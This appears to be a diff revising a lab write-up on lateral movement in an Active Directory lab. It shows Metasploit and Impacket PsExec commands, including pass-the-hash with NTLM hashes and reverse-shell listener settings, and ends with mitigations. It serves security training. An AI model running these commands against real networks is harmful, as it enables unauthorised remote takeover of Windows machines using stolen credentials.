@@ -1,230 +1,282 @@
+Gaining Shell Access via PsExec (Metasploit + Impacket)
 Overview
 
-This lab demonstrates how attackers gain remote shell access in an Active Directory environment using valid credentials and NTLM hashes.
+This lab demonstrates how attackers obtain remote shell access inside an Active Directory environment using valid credentials and NTLM password hashes. The objective was to simulate a realistic post-exploitation and lateral movement scenario following credential capture via techniques such as LLMNR/NBT-NS poisoning.
 
-The goal was to simulate a real post-exploitation scenario after credential capture (LLMNR/NBT-NS poisoning) and perform lateral movement using SMB.
+The focus of this lab is not initial access, but what happens after credentials are obtained. This stage is critical in real enterprise breaches, where attackers pivot across the network using administrative access over SMB.
 
-Techniques covered:
+Techniques covered in this lab include:
 
-Metasploit PsExec
+Metasploit PsExec exploitation
 
-Impacket PsExec
+Impacket PsExec usage
 
 Pass-the-Hash authentication
 
-Remote service execution
+Remote Windows service creation
 
-Tool comparison and failure scenarios
+Comparing multiple remote execution techniques
 
-Environment: Virtual AD Lab (Windows Domain + Kali)
+Understanding why some methods fail in modern environments
+
+Environment: Virtual Active Directory Lab (Windows Domain + Kali Linux)
 
 Lab Environment
 Machine	Role
-Kali Linux	Attacker
+Kali Linux	Attacker machine
 Windows Server	Domain Controller
-Windows 10	Domain Client
+Windows 10	Domain-joined client
 
-Key service:
+Key service used throughout the lab:
 
-SMB (Port 445)
+SMB (TCP Port 445)
+
+SMB is commonly exposed inside enterprise networks and is one of the most frequently abused services for lateral movement.
 
 Attack Chain Summary
 
-Capture credentials / NTLM hashes
+The simulated attack chain followed a realistic enterprise compromise workflow:
 
-Authenticate over SMB
+Capture credentials or NTLM password hashes
 
-Upload malicious executable
+Authenticate to a target machine over SMB
 
-Create remote Windows service
+Upload a malicious executable to the ADMIN$ share
 
-Execute payload → gain SYSTEM shell
+Create a remote Windows service
 
-This technique is known as Remote Service Execution via PsExec.
+Execute the service remotely
+
+Receive a SYSTEM-level shell
+
+This technique is commonly known as Remote Service Execution via PsExec.
 
 Part 1 — Metasploit PsExec (Password Authentication)
-Load module
-use exploit/windows/smb/psexec
-Configure options
-set rhosts <targetIP>
-set smbdomain <domain>
-set smbuser <username>
-set smbpass <password>
-Run exploit
-exploit
-Result
-
-Meterpreter reverse shell opened successfully.
-
-Key indicators:
-
-Authenticated via SMB
-
-Uploaded payload
-
-Created remote service
-
-Reverse TCP session established
+  Loading the Module
+  use exploit/windows/smb/psexec
+  
+  This Metasploit module performs remote service execution using SMB credentials.
+  
+  Configuring Required Options
+  set rhosts <targetIP>
+  set smbdomain <domain>
+  set smbuser <username>
+  set smbpass <password>
+  set LHOST <attackerIP>
+  set LPORT 4444
+  
+  These parameters define:
+  
+  Target host
+  
+  Authentication credentials
+  
+  Reverse shell listener settings
+  
+  Running the Module
+  
+  Instead of the traditional exploit command, the lab used:
+  
+  run
+  
+  This distinction is important and is explained later in the write-up.
+  
+  Result
+  
+  A Meterpreter reverse shell was successfully established.
+  
+  Key indicators of successful exploitation:
+  
+  SMB authentication succeeded
+  
+  Payload uploaded to ADMIN$ share
+  
+  Remote Windows service created
+  
+  Reverse TCP connection received
+  
+  This demonstrates how valid credentials alone can enable full remote compromise.
 
 Part 2 — Metasploit Pass-the-Hash
 
-Instead of a password, NTLM hashes were used.
+  Instead of using a plaintext password, the attack was repeated using NTLM hashes.
+  
+  NTLM hash format:
+  
+  LMHASH:NTHASH
+  
+  Typical LM hash placeholder:
+  
+  aad3b435b51404eeaad3b435b51404ee
+  Configuring the Module for Pass-the-Hash
+  set smbuser administrator
+  set smbpass LMHASH:NTHASH
+  set --clear smbdomain
+  run
+  Why Clearing the Domain Matters
+  
+  Metasploit automatically assigns a default domain (often WORKGROUP).
+  When targeting local administrator accounts, the domain value must be cleared.
+  
+  Failing to do this may cause authentication failures.
+  
+  Result
+  
+  Meterpreter shell obtained successfully without knowing the password.
+  
+  This demonstrates a critical concept:
+  
+  NTLM hashes function as reusable credentials.
 
-Hash format:
+Part 3 — Impacket PsExec (Password Authentication)
 
-LMHASH:NTHASH
+  Impacket tools provide a more realistic representation of real-world penetration testing workflows.
+  
+  Command Used
+  psexec.py DOMAIN/user:'password'@targetIP
+  Result
+  
+  A SYSTEM command shell was obtained:
+  
+  C:\Windows\system32>
+  
+  Unlike Metasploit, Impacket provides a direct interactive shell instead of a Meterpreter session.
 
-Example structure:
-
-aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
-Configure module
-set smbuser administrator
-set smbpass LMHASH:NTHASH
-set --clear smbdomain
-exploit
-Why clear domain?
-
-Metasploit defaults to WORKGROUP.
-Local admin attacks require clearing the domain value.
-
-Result
-
-Meterpreter shell obtained without knowing the password.
-
-Part 3 — Impacket PsExec (Password)
-
-Impacket provides a more realistic pentesting toolset.
-
-Command
-psexec.py DOMAIN/user:'password'@targetIP
-Result
-
-Direct SYSTEM command shell obtained:
-
-C:\Windows\system32>
 Part 4 — Impacket Pass-the-Hash
-Command
-psexec.py administrator@targetIP -hashes LMHASH:NTHASH
-Result
+  Command Used
+  psexec.py administrator@targetIP -hashes LMHASH:NTHASH
+  Result
+  
+  Successful SYSTEM shell using only NTLM hash authentication.
+  
+  This reinforces the concept that password hashes must be treated as passwords.
 
-Successful SYSTEM shell using only NTLM hash.
+Part 5 — Testing Alternative Remote Execution Methods
 
-This demonstrates why NTLM hashes must be treated as passwords.
-
-Part 5 — Testing Alternative Execution Methods
-wmiexec.py
-RPC_E_INVALID_HEADER
-
-Failed — WMI/DCOM likely blocked.
-
-smbexec.py
-Connection reset by peer
-
-Failed — common on modern Windows.
-
-Tool Reliability
-Tool	Method	Reliability
-psexec.py	Remote service creation	⭐⭐⭐⭐⭐
-wmiexec.py	WMI/DCOM	⭐⭐
-smbexec.py	SMB named pipes	⭐
-
-Real pentests typically start with PsExec.
-
-How PsExec Works (Behind the Scenes)
-
-Authenticate to SMB (port 445)
-
-Connect to ADMIN$ share
-
-Upload executable
-
-Create Windows service remotely
-
-Start service
-
-Receive SYSTEM shell
-
-This technique requires local admin privileges.
-
-Security Takeaways
-
-This lab highlights real enterprise risks:
-
-• NTLM hashes = reusable credentials
-• SMB admin shares enable remote execution
-• Local admin reuse enables lateral movement
-• Credential hygiene is critical in AD environments
-
-Mitigations:
-
-Disable LLMNR/NBT-NS
-
-Enforce SMB signing
-
-Limit local admin rights
-
-Implement LAPS
-
-Monitor remote service creation
-
-Skills Demonstrated
-
-Active Directory lab building
-
-Metasploit exploitation
-
-Impacket tool usage
-
-Pass-the-Hash attacks
-
-Lateral movement techniques
-Using run vs exploit in Metasploit
-
-During the lab the PsExec module was executed using:
-
-run
-
-Instead of:
-
-exploit
-Why this matters
-
-In Metasploit:
-
-Command	Behavior
-exploit	Runs exploit once
-run	Runs module with smart defaults (preferred in labs)
-
-For most exploit modules they behave the same, but run is commonly used in training and real engagements because:
-
-• It automatically starts required handlers
-• It respects payload defaults
-• It reduces configuration mistakes
-• It’s faster during repeated testing
-
-Final Metasploit Workflow (Corrected)
-use exploit/windows/smb/psexec
-
-set rhosts <targetIP>
-set smbuser <username>
-set smbpass <password>
-
-set LHOST <attackerIP>
-set LPORT 4444
-
-run
-Output observed
-Started reverse TCP handler
-Authenticating to SMB
-Executing payload
-Meterpreter session opened
-
-Successful reverse shell established.
-
-🧠 SHORT ADDITION — PASS-THE-HASH WITH run
-set smbuser administrator
-set smbpass LMHASH:NTHASH
-set --clear smbdomain
-run
-
-Again — shell obtained without password.
+  Multiple Impacket tools were tested to evaluate reliability.
+  
+  wmiexec.py Attempt
+  
+  Result:
+  
+  RPC_E_INVALID_HEADER
+  
+  Likely causes:
+  
+  WMI/DCOM restrictions
+  
+  Firewall filtering
+  
+  Endpoint hardening
+  
+  smbexec.py Attempt
+  
+  Result:
+  
+  Connection reset by peer
+  
+  Likely causes:
+  
+  SMB hardening
+  
+  Modern Windows protections
+  
+  Tool Reliability Comparison
+  Tool	Execution Method	Reliability
+  psexec.py	Remote service creation	Very high
+  wmiexec.py	WMI/DCOM	Moderate
+  smbexec.py	SMB named pipes	Low
+  
+  In real engagements, PsExec is typically the first technique attempted.
+  
+  How PsExec Works Internally
+  
+  PsExec abuses administrative privileges to perform remote service execution:
+  
+  Authenticate to SMB (port 445)
+  
+  Connect to ADMIN$ administrative share
+  
+  Upload malicious executable
+  
+  Create a Windows service remotely
+  
+  Start the service
+  
+  Receive SYSTEM-level shell
+  
+  This technique requires local administrator privileges on the target machine.
+  
+  Using run vs exploit in Metasploit
+  
+  During the lab, the PsExec module was executed using:
+  
+  run
+  
+  instead of:
+  
+  exploit
+  Difference Between Commands
+  Command	Behavior
+  exploit	Executes module once
+  run	Executes module using smart defaults
+  
+  run is commonly used because it:
+  
+  Automatically starts listeners
+  
+  Uses payload defaults
+  
+  Reduces configuration mistakes
+  
+  Speeds up repeated testing
+  
+  Final Metasploit Workflow
+  use exploit/windows/smb/psexec
+  set rhosts <targetIP>
+  set smbuser <username>
+  set smbpass <password>
+  set LHOST <attackerIP>
+  set LPORT 4444
+  run
+  Security Implications
+  
+  This lab highlights several major enterprise security risks:
+  
+  NTLM hashes can be reused for authentication
+  
+  SMB admin shares allow remote code execution
+  
+  Local admin credential reuse enables lateral movement
+  
+  Weak credential hygiene accelerates network compromise
+  
+  Mitigations
+  
+  Organizations can reduce risk by implementing:
+  
+  Disabling LLMNR and NBT-NS
+  
+  Enforcing SMB signing
+  
+  Restricting local administrator privileges
+  
+  Deploying Microsoft LAPS
+  
+  Monitoring remote service creation events
+  
+  Implementing credential guard protections
+  
+  Skills Demonstrated
+  
+  Active Directory lab design and deployment
+  
+  Post-exploitation and lateral movement
+  
+  Metasploit exploitation workflows
+  
+  Impacket tool usage
+  
+  Pass-the-Hash authentication
+  
+  Windows remote execution techniques
